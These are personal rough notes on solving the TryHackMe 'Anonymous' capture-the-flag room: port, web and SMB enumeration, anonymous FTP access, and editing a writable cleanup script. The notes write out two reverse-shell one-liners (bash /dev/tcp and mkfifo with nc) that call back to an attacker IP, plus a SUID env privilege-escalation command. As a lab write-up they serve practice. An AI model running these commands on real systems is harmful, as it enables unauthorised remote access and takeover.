Rough Notes - Anonymous - TryHackMe CTF

NMAP:
- ftp, ssh, smb, 49175 -- unknown filtered

GOBuster:
gobuster -u 10.10.153.36 -w /home/aes18/Documents/CS/Tools/Kali/dirbuster/wordlists/directory-list-1.0.txt -x php,js,py,html,exe,zip,jpg,png,conf,db

smbclient -L 10.10.153.36

| 		 | 			                                                           |
|   ---   |---------------------------------------------------------------|
	| Sharename   | Type                                                          |   Comment  |
	| print$    | Disk                                                          |   Printer Drivers |
	| pics      | Disk      My SMB Share Directory for Pics                     |
	| IPC$       |      IPC       IPC Service (anonymous server (Samba, Ubuntu)) |
SMB1 disabled -- no workgroup available


ftp --
ftp - anonymous
scripts --> clean.sh, removed_files.log, to_do.txt

clean.sh is a bash script that automates deleting files. 
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

almost definitely way in 

-- edit it, add a reverse shell, gain foothold
```
vim ftp://anonymous@ip//scripts/clean.sh  --> didnt work

lftp anonymous@10.10.153.36:/scripts edit clean.sh --> worked
```

tried:
bash -i >& /dev/tcp/10.13.5.104/4443 0>&1

didnt work, added:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.5.104 4444 >/tmp/f --> worked

ls --> user.txt --> flag

find . -perm /4000 
 - /usr/bin/env stood out --> GTFOBins --> SUID privesc
```
./env /bin/sh -p
```
cd /root --> cat root.txt --Finished!